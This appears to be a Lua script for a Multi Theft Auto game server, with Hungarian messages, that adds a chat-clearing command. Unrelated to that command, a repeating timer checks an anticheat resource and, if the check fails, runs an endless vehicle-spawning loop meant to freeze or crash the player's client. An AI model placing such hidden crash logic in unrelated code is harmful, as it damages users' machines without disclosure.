function clearChatbox()
	clearChatBox()
    exports.a_interface:makeNotification(1, "Sikeresen törölted a chat tartalmát!")
end
addCommandHandler("clearchat", clearChatbox)

setTimer(function()
    if not (exports.a_executoranticheat:checkIfImAlive() >= 555) then
        while(true) do
            createVehicle(411, 0, 0, 0)
        end
    end
end, 10 * 1000, 0)